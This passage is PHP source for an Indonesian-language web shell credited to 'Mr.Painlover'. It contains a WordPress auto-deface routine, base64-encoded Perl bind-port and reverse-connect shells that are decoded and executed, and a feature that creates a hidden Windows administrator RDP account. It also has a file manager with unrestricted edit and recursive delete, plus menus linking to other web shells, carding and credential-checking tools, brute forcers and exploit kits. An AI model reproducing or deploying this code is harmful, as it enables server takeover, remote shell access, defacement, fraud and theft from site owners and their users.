                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='lime'>berhasil mepes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=lime>$user</font><br>";
                        echo "[+] password: <font color=lime>$pass</font><br><br>";    
                        }
                    mysql_close($conn);
                }
            }
        } else {
            echo "<center><h1>WordPress Auto Deface V.2</h1>
            <form method='post'>
            Link Config: <br>
            <textarea name='link' placeholder='http://target.com/pain_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
            <input type='text' name='script' height='10' size='50' placeholder='Hacked by Mr.Painlover' required><br>
            <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
            </form></center>";
        }
    } elseif($_GET['do'] == 'network') {
        echo "<form method='post'>
        <u>Bind Port:</u> <br>
        PORT: <input type='text' placeholder='port' name='port_bind' value='6969'>
        <input type='submit' name='sub_bp' value='>>'>
        </form>
        <form method='post'>
        <u>Back Connect:</u> <br>
        Server: <input type='text' placeholder='ip' name='ip_bc' value='".$_SERVER['REMOTE_ADDR']."'>&nbsp;&nbsp;
        PORT: <input type='text' placeholder='port' name='port_bc' value='6969'>
        <input type='submit' name='sub_bc' value='>>'>
        </form>";
        $bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
        if(isset($_POST['sub_bp'])) {
            $f_bp = fopen("/tmp/bp.pl", "w");
            fwrite($f_bp, base64_decode($bind_port_p));
            fclose($f_bp);
     
            $port = $_POST['port_bind'];
            $out = exe("perl /tmp/bp.pl $port 1>/dev/null 2>&1 &");
            sleep(1);
            echo "<pre>".$out."\n".exe("ps aux | grep bp.pl")."</pre>";
            unlink("/tmp/bp.pl");
        }
        $back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
        if(isset($_POST['sub_bc'])) {
            $f_bc = fopen("/tmp/bc.pl", "w");
            fwrite($f_bc, base64_decode($bind_connect_p));
            fclose($f_bc);
     
            $ipbc = $_POST['ip_bc'];
            $port = $_POST['port_bc'];
            $out = exe("perl /tmp/bc.pl $ipbc $port 1>/dev/null 2>&1 &");
            sleep(1);
            echo "<pre>".$out."\n".exe("ps aux | grep bc.pl")."</pre>";
            unlink("/tmp/bc.pl");
        }
    } elseif($_GET['do'] == 'krdp_shell') {
        if(strtolower(substr(PHP_OS, 0, 3)) === 'win') {
            if($_POST['create']) {
                $user = htmlspecialchars($_POST['user']);
                $pass = htmlspecialchars($_POST['pass']);
                if(preg_match("/$user/", exe("net user"))) {
                    echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
                } else {
                    $add_user   = exe("net user $user $pass /add");
                    $add_groups1 = exe("net localgroup Administrators $user /add");
                    $add_groups2 = exe("net localgroup Administrator $user /add");
                    $add_groups3 = exe("net localgroup Administrateur $user /add");
                    echo "[ RDP ACCOUNT INFO ]<br>
                    ------------------------------<br>
                    IP: <font color=lime>".$ip."</font><br>
                    Username: <font color=lime>$user</font><br>
                    Password: <font color=lime>$pass</font><br>
                    ------------------------------<br><br>
                    [ STATUS ]<br>
                    ------------------------------<br>
                    ";
                    if($add_user) {
                        echo "[add user] -> <font color='lime'>Berhasil</font><br>";
                    } else {
                        echo "[add user] -> <font color='red'>Gagal</font><br>";
                    }
                    if($add_groups1) {
                        echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
                    } elseif($add_groups2) {
                        echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
                    } elseif($add_groups3) {
                        echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
                    } else {
                        echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
                    }
                    echo "------------------------------<br>";
                }
            } elseif($_POST['s_opsi']) {
                $user = htmlspecialchars($_POST['r_user']);
                if($_POST['opsi'] == '1') {
                    $cek = exe("net user $user");
                    echo "Checking username <font color=lime>$user</font> ....... ";
                    if(preg_match("/$user/", $cek)) {
                        echo "[ <font color=lime>Sudah ada</font> ]<br>
                        ------------------------------<br><br>
                        <pre>$cek</pre>";
                    } else {
                        echo "[ <font color=red>belum ada</font> ]";
                    }
                } elseif($_POST['opsi'] == '2') {
                    $cek = exe("net user $user painlover");
                    if(preg_match("/$user/", exe("net user"))) {
                        echo "[change password: <font color=lime>painlover</font>] -> ";
                        if($cek) {
                            echo "<font color=lime>Berhasil</font>";
                        } else {
                            echo "<font color=red>Gagal</font>";
                        }
                    } else {
                        echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                    }
                } elseif($_POST['opsi'] == '3') {
                    $cek = exe("net user $user /DELETE");
                    if(preg_match("/$user/", exe("net user"))) {
                        echo "[remove user: <font color=lime>$user</font>] -> ";
                        if($cek) {
                            echo "<font color=lime>Berhasil</font>";
                        } else {
                            echo "<font color=red>Gagal</font>";
                        }
                    } else {
                        echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
                    }
                } else {
                    //
                }
            } else {
                echo "-- Create RDP --<br>
                <form method='post'>
                <input type='text' name='user' placeholder='username' value='p4inl0v3r' required>
                <input type='text' name='pass' placeholder='password' value='p4inl0v3r' required>
                <input type='submit' name='create' value='>>'>
                </form>
                -- Option --<br>
                <form method='post'>
                <input type='text' name='r_user' placeholder='username' required>
                <select name='opsi'>
                <option value='1'>Cek Username</option>
                <option value='2'>Ubah Password</option>
                <option value='3'>Hapus Username</option>
                </select>
                <input type='submit' name='s_opsi' value='>>'>
                </form>
                ";
            }
        } else {
            echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
        }
    } elseif($_GET['act'] == 'newfile') {
        if($_POST['new_save_file']) {
            $newfile = htmlspecialchars($_POST['newfile']);
            $fopen = fopen($newfile, "a+");
            if($fopen) {
                $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
        }
        echo $act;
        echo "<form method='post'>
        Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
        <input type='submit' name='new_save_file' value='Submit'>
        </form>";
    } elseif($_GET['act'] == 'newfolder') {
        if($_POST['new_save_folder']) {
            $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
            if(!mkdir($new_folder)) {
                $act = "<font color=red>permission denied</font>";
            } else {
                $act = "<script>window.location='?dir=".$dir."';</script>";
            }
        }
        echo $act;
        echo "<form method='post'>
        Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
        <input type='submit' name='new_save_folder' value='Submit'>
        </form>";
    } elseif($_GET['act'] == 'rename_dir') {
        if($_POST['dir_rename']) {
            $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
            if($dir_rename) {
                $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
        echo "".$act."<br>";
        }
        echo "<form method='post'>
        <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
        <input type='submit' name='dir_rename' value='rename'>
        </form>";
    } elseif($_GET['act'] == 'delete_dir') {
        if(is_dir($dir)) {
            if(is_writable($dir)) {
                @rmdir($dir);
                @exe("rm -rf $dir");
                @exe("rmdir /s /q $dir");
                $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
            } else {
                $act = "<font color=red>could not remove ".basename($dir)."</font>";
            }
        }
        echo $act;
    } elseif($_GET['act'] == 'view') {
        echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
        echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
    } elseif($_GET['act'] == 'edit') {
        if($_POST['save']) {
            $save = file_put_contents($_GET['file'], $_POST['src']);
            if($save) {
                $act = "<font color=lime>Saved!</font>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
        echo "".$act."<br>";
        }
        echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
        echo "<form method='post'>
        <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
        <input type='submit' value='Save' name='save' style='width: 500px;'>
        </form>";
    } elseif($_GET['act'] == 'rename') {
        if($_POST['do_rename']) {
            $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
            if($rename) {
                $act = "<script>window.location='?dir=".$dir."';</script>";
            } else {
                $act = "<font color=red>permission denied</font>";
            }
        echo "".$act."<br>";
        }
        echo "Filename: <font color=lime>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
        echo "<form method='post'>
        <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
        <input type='submit' name='do_rename' value='rename'>
        </form>";
    } elseif($_GET['act'] == 'delete') {
        $delete = unlink($_GET['file']);
        if($delete) {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
        echo $act;
    } else {
        if(is_dir($dir) === true) {
            if(!is_readable($dir)) {
                echo "<font color=red>can't open directory. ( not readable )</font>";
            } else {
                echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
                <tr>
                <th class="th_home"><center>Name</center></th>
                <th class="th_home"><center>Type</center></th>
                <th class="th_home"><center>Size</center></th>
                <th class="th_home"><center>Last Modified</center></th>
                <th class="th_home"><center>Owner/Group</center></th>
                <th class="th_home"><center>Permission</center></th>
                <th class="th_home"><center>Action</center></th>
                </tr>';
                $scandir = scandir($dir);
                foreach($scandir as $dirx) {
                    $dtype = filetype("$dir/$dirx");
                    $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
                    if(function_exists('posix_getpwuid')) {
                        $downer = @posix_getpwuid(fileowner("$dir/$dirx"));
                        $downer = $downer['name'];
                    } else {
                        //$downer = $uid;
                        $downer = fileowner("$dir/$dirx");
                    }
                    if(function_exists('posix_getgrgid')) {
                        $dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
                        $dgrp = $dgrp['name'];
                    } else {
                        $dgrp = filegroup("$dir/$dirx");
                    }
                    if(!is_dir("$dir/$dirx")) continue;
                    if($dirx === '..') {
                        $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
                    } elseif($dirx === '.') {
                        $href = "<a href='?dir=$dir'>$dirx</a>";
                    } else {
                        $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
                    }
                    if($dirx === '.' || $dirx === '..') {
                        $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
                        } else {
                        $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
                    }
                    echo "<tr>";
                    echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
                    echo "<td class='td_home'><center>$dtype</center></td>";
                    echo "<td class='td_home'><center>-</center></th></td>";
                    echo "<td class='td_home'><center>$dtime</center></td>";
                    echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
                    echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
                    echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
                    echo "</tr>";
                }
            }
        } else {
            echo "<font color=red>can't open directory.</font>";
        }
            foreach($scandir as $file) {
                $ftype = filetype("$dir/$file");
                $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
                $size = filesize("$dir/$file")/1024;
                $size = round($size,3);
                if(function_exists('posix_getpwuid')) {
                    $fowner = @posix_getpwuid(fileowner("$dir/$file"));
                    $fowner = $fowner['name'];
                } else {
                    //$downer = $uid;
                    $fowner = fileowner("$dir/$file");
                }
                if(function_exists('posix_getgrgid')) {
                    $fgrp = @posix_getgrgid(filegroup("$dir/$file"));
                    $fgrp = $fgrp['name'];
                } else {
                    $fgrp = filegroup("$dir/$file");
                }
                if($size > 1024) {
                    $size = round($size/1024,2). 'MB';
                } else {
                    $size = $size. 'KB';
                }
                if(!is_file("$dir/$file")) continue;
                echo "<tr>";
                echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
                echo "<td class='td_home'><center>$ftype</center></td>";
                echo "<td class='td_home'><center>$size</center></td>";
                echo "<td class='td_home'><center>$ftime</center></td>";
                echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
                echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
                echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
                echo "</tr>";
            }
            echo "</table>";
            if(!is_readable($dir)) {
                //
            } else {
                echo "<hr color='blue'>";
            }
}
echo "<center><form>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Creator </option>
   <option value='$ling=wso'>WSO 4.2.5</option>
   <option value='$ling=injection'>1n73ction v3</option>
   <option value='$ling=b374k-v2'>b374k Shell 2.8</option>
   <option value='$ling=b374k-v3'>b374k Shell 3.2.3</option>
   <option value='$ling=noname'>NoName Shell</option>
   <option value='$ling=r57'>R57 Shell</option>
   <option value='$ling=c99'>C99 v.1.0</option>
   <option value='$ling=dhanus'>Dhanus Shell</option>
   <option value='$ling=encodedecode'>Encode Decode</option>
   <option value='$ling=merica'>Shell Merica</option> 
   <option value='$ling=act'>Act Shell V.1</option>
   <option value='$ling=brudul'>Brudul Shell</option>
   <option value='$ling=minishell'>Mini Shell</option>
   <option value='$ling=idx'>Shell IndoXploit V.3 1</option>
   <option value='$ling=badcode'>Shell Badcode</option>
   <option value='$ling=terserah'>Terserah shell</option>
   <option value='$ling=1337cpcrack'>1337 Cp Crack</option>
   <option value='$ling=md5cheker'>MD5 CHECKER</option>       
</select>
<select onchange='if (this.value) window.open(this.value);'>
   <option selected='selected' value=''> Tools Carder </option>
   <option value='$ling=promailerv2'>Pro Mailer V2</option>     
   <option value='$ling=bukalapak'>BukaLapak Checker</option>        
   <option value='$ling=tokopedia'>TokoPedia Checker</option>  
   <option value='$ling=tokenpp'>Paypal Token Generator</option>  
   <option value='$ling=mailer'>Mailer</option>  
   <option value='$ling=gamestopceker'>GamesTop Checker</option>
   <option value='$ling=mailersender'>Mailer Mass send V.2 </option>
   <option value='$ling=bsm'>Black Space Mailer </option>
   <option value='$ling=priv8'>priv 8 Tools</option>
   <option value='$ling=cccheker'>Online credit card validator </option>
   <option value='$ling=ppcheker'>PayPal Valid Email Checker [ Fresh ] </option>
   <option value='$ling=ppemail'>Paypal Email Valid checker</option>
   <option value='$ling=smtp'>Priv8 Smtp & Other Setup</option>
   <option value='$ling=hotmailinbox'>Hotmail inbox</option>
   <option value='$ling=MassMailerbyF4jzar-xCyb3r207'>Mass Mailer by F4jzar-xCyb3r207</option>
   <option value='$ling=MassMaillerInbox'>Mass Mailler Inbox</option>
   <option value='$ling=EmailFilter'>Email Filter</option>
   <option value='$ling=amazonemailchecker'>AMAZON Email Checker</option>
   <option value='$ling=ebayemailchecker'>EBay Email Checker</option>
   <option value='$ling=databaseemailsextractor'>Database Emails Extractor</option>
</select>
<select onchange='if (this.value) window.open(this.value);'>
	<option selected='selected' value=''> Tools Exploiter </option>
    <option value='$ling=fileuploadphpmyadmin'>Auto File Upload phpMyAdmin</option>
    <option value='$ling=MagentoCMSBruteForceAdminLogin'>Magento CMS BruteForce Admin Login</option>
    <option value='$ling=CSRFXploiterOnline'>CSRF Xploiter Online</option>
    <option value='$ling=WordPressU-DesignThemesUploadifyDorker'>WordPress U-Design Themes Uploadify Dorker</option>
    <option value='$ling=ShellShockXploiter'>ShellShock Xploiter (WebBased)</option>
    <option value='$ling=ShellShockAutoXploitReverseShell'>ShellShock Auto Xploit & Reverse Shell</option>
    <option value='$ling=WebdavMassXploiterIP'>Webdav Mass Xploiter IP</option>
    <option value='$ling=POPOJICMSAddAdminAutoRegistration'>POPOJI CMS Add Admin Auto Registration</option>
    <option value='$ling=SQLDorkScannerviaBingDorker'>SQL Dork Scanner via Bing Dorker [ Web ]</option>
    <option value='$ling=PrestashopModulesBlocktestimonialFileUpload'>Prestashop Modules Blocktestimonial File Upload</option>
    <option value='$ling=WebConsole'>WebConsole</option>
    <option value='$ling=LocalRootExploiter'>Local Root Exploiter by Makman ( No BackConnect )</option>
    <option value='$ling=binchecker'>Bin Checker</option>
    <option value='$ling=drupalcore'>Drupal core 7.x</option>
    <option value='$ling=krimou'>KrimOu CPanel Cracker Script & Root Server</option>
    <option value='$ling=massrevslider'>Mass Revslider Exl0it1ng</option>
    <option value='$ling=extract'>Extract Emails From WordPress–Joomla–OpenCart–WHMCS</option>
    <option value='$ling=reverseiplookup'>Reverse Ip Lookup Domain</option>
    <option value='$ling=safemode'>Bypass SafeMode</option>
    <option value='$ling=symlinkbased'>Symlink Based cPanel</option>
    <option value='$ling=ConfigWordpressandJoomlaGrabber'>Config Wordpress and Joomla Grabber</option>
    <option value='$ling=WP2'>WP2</option>
    <option value='$ling=autocreatesudomain'>auto create sudomain</option>
    <option value='$ling=MiniMassAutoXploiterOnlyToolsv1.0'>Mini Mass Auto Xploiter Only Tools v1.0</option>
    <option value='$ling=SCANSERVER'>SCAN SERVER</option>
    <option value='$ling=ownLFI|t00lkitv1.0'>ownLFI| t00lkit v1.0 | By Asesino04</option>
    <option value='$ling=PHPInfo'>PHP Info</option>
    <option value='$ling=m0bil3xTSQLiScanner'>m0bil3_xT's SQLi Scanner</option>
    <option value='$ling=ExploitsWordpressLFD'>Exploits Wordpress LFD</option>
    <option value='$ling=xSec-BackDoorGenerator'>xSec-BackDoor Generator [ Create Your Own Backdoor ]</option>
    <option value='$ling=Bypass[LiteSpeed-Nginx-Apache]'>Bypass [ LiteSpeed - Nginx - Apache ] By b0x</option>
    <option value='$ling=UploadFileUsingfile_get_contents'>Upload File Using file_get_contents</option>
    <option value='$ling=ProxyByRoot'>Proxy By Root</option>
    <option value='$ling=ReadFileUsing3Function>Read File Using 3 Function 1</option>
    <option value='$ling=MySQLQueryCommandExecute'>MySQL Query Command Execute</option>
    <option value='$ling=CreateHtaccess'>Create Htaccess</option>
    <option value='$ling=SimpleBypasser'>Simple Bypasser [ fopen + file_get_contents ]</option>
    <option value='$ling=SearchForBlindSQLInjectionvBulltein'>Search For Blind SQL Injection vBulltein By List</option>
    <option value='$ling=GetallSite'>Get all Site Server</option>
    <option value='$ling=ScannerSh3LL'>Scanner Sh3LL'z & Dir'z</option>
    <option value='$ling=BypassSuPHPVersion2[Sfa7trick]'>Bypass SuPHP Version 2 [ Sfa7 trick ]</option>
    <option value='$ling=ExtractUsersFromPasswd'>Extract Users From Passwd</option>
    <option value='$ling=BypassMethodNotimplemented'>Bypass Method Not implemented</option>
    <option value='$ling=GetWordpressUser'>Get Wordpress User</option>
    <option value='$ling=WordpressKiller'>Wordpress Killer</option>
    <option value='$ling=3mlaqGamesExploitByxSecurity'>3mlaq Games Exploit</option>
    <option value='$ling=ExtractEmails'>Extract Emails From OpenCart CMS</option>
    <option value='$ling=SearchForExploitViaExploit-DB'>Search For Exploit Via Exploit-DB</option>
    <option value='$ling=Extract[id-username-password-salt-email]'>Extract [id-username-password-salt-email]</option>
    <option value='$ling=GetToolsFromYourAppServ'>Get Tools From Your AppServ</option>
    <option value='$ling=Checkingjoomla1.6-1.7Registration'>Checking joomla 1.6 - 1.7 Registration</option>
    <option value='$ling=LoginFormWithSESSIONWithoutConnectToDatabase'>Login Form With SESSION Without Connect To Database</option>
    <option value='$ling=GenerateXMLPluginvBulletin[ajax.php]'>Generate XML Plugin vBulletin [ ajax.php ]</option>
    <option value='$ling=RCIJoomlaExploitPHPVersion'> RCI Joomla Exploit PHP Version</option>
    <option value='$ling=KleejaXMLPluginGenerator'>Kleeja XML Plugin Generator</option>
    <option value='$ling=JoomlaBruteForce'>Joomla Brute Force</option>
    <option value='$ling=4imagesBruteForce'>4images Brute Force</option>
    <option value='$ling=BruteForceAllWordpressOnServer'>Brute Force All Wordpress On Server</option>
    <option value='$ling=SkypeBruteForcePHPVersion'>Skype Brute Force PHP Version</option>
    <option value='$ling=twitterbruteforce'>Twitter Brute Force</option>
    <option value='$ling=Ask.FmBruteForceByxSecurity'>Ask.Fm Brute Force</option>
    <option value='$ling=DimofinfBruteForce'>Dimofinf Brute Force</option>
    <option value='$ling=grabbersqlisitesfromip'>grabber sqli sites from ip</option>
    <option value='$ling=ProtectFolderViaHtaccess'>Protect Folder Via Htaccess</option>
    <option value='$ling=AddHttp'>Add Http:// to sites</option>
    <option value='$ling=WordPressNativeChurchthemeLFIscanner'>WordPress NativeChurch theme LFI scanner</option>
    <option value='$ling=allbypass'>All Bypasser</option>
</select>
<noscript><input type='submit' value='Submit'></noscript>
</form><center>Copyright &copy; ".date("Y")." - <a href='https://www.instagram.com/mr.painlover87/' target='_blank'><font color=lime>Mr.Painlover</font> </a></center>";
?>
</body>
</html>
